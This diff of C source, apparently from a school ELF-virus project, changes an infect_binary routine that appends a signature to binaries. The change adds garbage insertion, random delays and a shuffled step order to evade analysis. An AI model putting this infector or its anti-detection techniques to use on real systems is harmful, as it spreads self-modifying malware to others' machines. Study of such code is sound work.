@@ -6,7 +6,7 @@
 /*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/07 16:03:22 by jainavas          #+#    #+#             */
-/*   Updated: 2026/01/09 18:24:12 by jainavas         ###   ########.fr       */
+/*   Updated: 2026/01/09 19:15:02 by jainavas         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -54,20 +54,45 @@ int infect_binary(const char *filepath)
     Elf64_Shdr *new_shdr;
     int ret = -1;
     
+	insert_garbage();
+
+	int order = get_execution_order();
+
     // 1. Parsear ELF
-    if (parse_elf(filepath, &elf) < 0)
-        return -1;
+    if (order == 0 || order == 1) {
+        if (parse_elf(filepath, &elf) < 0)
+            return -1;
+        insert_garbage();
+    }
     
-    // 2. Verificar si ya está infectado
+    // 3. Obtener firma
+    if (order == 2 || order == 3) {
+        sig = get_signature();
+        sig_len = strlen(sig) + 1;
+        random_delay();
+    }
+
+	if (order == 2 || order == 3) {
+        if (parse_elf(filepath, &elf) < 0)
+            return -1;
+        insert_garbage();
+    }
+    
+	if (order == 0 || order == 1) {
+        sig = get_signature();
+        sig_len = strlen(sig) + 1;
+        insert_garbage();
+    }
+
+	insert_garbage();
+    
     if (is_infected(&elf)) {
         cleanup_elf(&elf);
         return 0;
     }
-    
-    // 3. Obtener firma
-    sig = get_signature();
-    sig_len = strlen(sig) + 1;
-    
+
+	random_delay();
+
     // 4. Guardar tamaño original ANTES de cleanup
     original_size = elf.size;
     
@@ -79,6 +104,8 @@ int infect_binary(const char *filepath)
         return -1;
     }
     
+	insert_garbage();
+
     // 6. Copiar archivo original
     memcpy(new_data, elf.data, original_size);
     
@@ -116,6 +143,8 @@ int infect_binary(const char *filepath)
         }
     }
     
+	insert_garbage();
+
     if (last_section >= 0) {
         new_shdr[last_section].sh_size += sig_len;
     }
